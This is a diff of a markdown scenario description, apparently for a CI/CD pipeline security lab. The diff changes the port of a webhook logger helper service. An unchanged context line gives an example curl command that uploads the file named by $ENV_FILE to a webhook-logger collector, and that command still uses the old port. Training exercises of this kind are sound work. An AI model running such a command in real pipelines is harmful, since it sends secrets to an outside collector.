@@ -35,7 +35,7 @@ Sensitive values cannot only be found in pipeline logs, but also in generated Ar
 
 ## Scenario Description
 
-**Helper Service:** To extract information from CI/CD pipelines, you can use the webhook logger service at `http://localhost:8084`. Any request to it will be logged and you can view the request logs at `http://localhost:8084/logs`. 
+**Helper Service:** To extract information from CI/CD pipelines, you can use the webhook logger service at `http://localhost:7705`. Any request to it will be logged and you can view the request logs at `http://localhost:7705/logs`. 
 
 Example curl command: `curl -k -sSf -X POST -F "files=@$ENV_FILE" http://webhook-logger:8084`
 
